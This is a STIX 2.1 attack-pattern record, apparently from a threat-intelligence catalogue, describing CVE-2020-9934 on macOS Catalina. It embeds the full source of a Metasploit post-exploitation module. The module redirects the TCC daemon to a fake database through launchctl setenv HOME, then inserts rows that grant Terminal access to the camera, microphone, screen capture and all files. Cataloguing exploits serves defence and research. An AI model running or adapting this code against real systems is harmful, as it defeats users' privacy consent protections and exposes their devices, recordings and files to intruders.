{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8f1f67f5-3df4-4a6a-9a66-802fcec616b4",
    "created": "2024-08-14T16:33:00.213521Z",
    "modified": "2024-08-14T16:33:00.213525Z",
    "name": "Bypass the macOS TCC Framework",
    "description": " This module exploits a vulnerability in the TCC daemon on macOS Catalina (<= 10.15.5) in order to grant TCC entitlements. The TCC daemon can be manipulated (by setting the HOME environment variable) to use a new user controlled location as the TCC database. We can then grant ourselves entitlements by inserting them into this new database.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/escalate/tccbypass.rb",
            "external_id": "tccbypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9934"
        },
        {
            "source_name": "reference",
            "url": "https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/mattshockl/CVE-2020-9934"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Bypass the macOS TCC Framework',\n        'Description' => %q{\n          This module exploits a vulnerability in the TCC daemon on macOS Catalina\n          (<= 10.15.5) in order to grant TCC entitlements. The TCC daemon can be\n          manipulated (by setting the HOME environment variable) to use a new user\n          controlled location as the TCC database. We can then grant ourselves\n          entitlements by inserting them into this new database.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'mattshockl', # discovery\n          'timwr', # metasploit module\n        ],\n        'References' => [\n          ['CVE', '2020-9934'],\n          ['URL', 'https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8'],\n          ['URL', 'https://github.com/mattshockl/CVE-2020-9934'],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ CONFIG_CHANGES, ARTIFACTS_ON_DISK, SCREEN_EFFECTS ],\n          'Reliability' => []\n        },\n        'Platform' => [ 'osx' ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ]\n      )\n    )\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable directory', '/tmp'])\n    ])\n  end\n\n  def check\n    system_version = get_system_version\n    unless system_version\n      return Exploit::CheckCode::Unknown\n    end\n\n    version = Rex::Version.new(system_version)\n    if version >= Rex::Version.new('10.15.6')\n      return Exploit::CheckCode::Safe\n    elsif version < Rex::Version.new('10.15.0')\n      return Exploit::CheckCode::Unknown\n    else\n      return Exploit::CheckCode::Appears\n    end\n  end\n\n  def run\n    if check != Exploit::CheckCode::Appears\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    tmpdir = \"#{datastore['WritableDir']}/.#{Rex::Text.rand_text_alpha(8)}\"\n    tccdir = \"#{tmpdir}/Library/Application Support/com.apple.TCC\"\n    tccdb = \"#{tccdir}/TCC.db\"\n\n    print_status(\"Creating TCC directory #{tccdir}\")\n    cmd_exec(\"mkdir -p '#{tccdir}'\")\n    cmd_exec(\"launchctl setenv HOME '#{tmpdir}'\")\n    cmd_exec('launchctl stop com.apple.tccd && launchctl start com.apple.tccd')\n    unless file_exist?(tccdb)\n      print_error(\"No fake TCC DB found: #{tccdb}\")\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n    print_good(\"fake TCC DB found: #{tccdb}\")\n\n    tcc_services = [\n      'kTCCServiceCamera', 'kTCCServiceMicrophone', 'kTCCServiceAll', 'kTCCServiceScreenCapture', 'kTCCServiceSystemPolicyDocumentsFolder', 'kTCCService',\n      'kTCCServiceSystemPolicyDeveloperFiles', 'kTCCServiceSystemPolicyDesktopFolder', 'kTCCServiceSystemPolicyAllFiles', 'kTCCServiceSystemPolicyNetworkVolumes',\n      'kTCCServiceSystemPolicySysAdminFiles', 'kTCCServiceSystemPolicyDownloadsFolder'\n    ]\n    bundle = 'com.apple.Terminal'\n    csreq = 'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003'\n    isfile = '0'\n    timestamp = 1.year.from_now.to_i.to_s\n    for service in tcc_services\n      sql_insert = \"INSERT INTO access VALUES('#{service}', '#{bundle}', #{isfile}, 1, 1, X'#{csreq}', NULL, NULL, 'UNUSED', NULL, NULL, #{timestamp});\"\n      sqloutput = cmd_exec(\"sqlite3 '#{tccdb}' \\\"#{sql_insert}\\\"\")\n      if sqloutput && !sqloutput.empty?\n        print_error(\"Output: #{sqloutput.length}\")\n      end\n    end\n    print_good('TCC.db was successfully updated!')\n    cleanup_command = 'launchctl unsetenv HOME && launchctl stop com.apple.tccd && launchctl start com.apple.tccd'\n    cleanup_command << \"\\nrm -rf '#{tmpdir}'\"\n    print_status(\"To cleanup, run:\\n#{cleanup_command}\\n\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}